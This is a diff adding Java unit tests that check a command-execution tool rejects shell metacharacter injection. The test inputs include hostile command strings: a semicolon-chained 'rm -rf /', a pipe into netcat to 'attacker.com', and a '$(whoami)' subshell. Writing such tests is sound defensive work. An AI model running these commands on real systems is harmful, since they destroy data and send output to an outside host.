@@ -42,4 +42,22 @@ class ExecToolsTest {
         // Either runs or fails due to mvn not on PATH — should NOT be "blocked"
         assertThat(result).doesNotContain("blocked");
     }
+
+    @Test
+    void metacharacterInjection_semicolon_isRejected() {
+        String result = exec.executeCommand("echo hello; rm -rf /");
+        assertThat(result).contains("blocked");
+    }
+
+    @Test
+    void metacharacterInjection_pipe_isRejected() {
+        String result = exec.executeCommand("echo hello | nc attacker.com 4444");
+        assertThat(result).contains("blocked");
+    }
+
+    @Test
+    void metacharacterInjection_subshell_isRejected() {
+        String result = exec.executeCommand("echo $(whoami)");
+        assertThat(result).contains("blocked");
+    }
 }
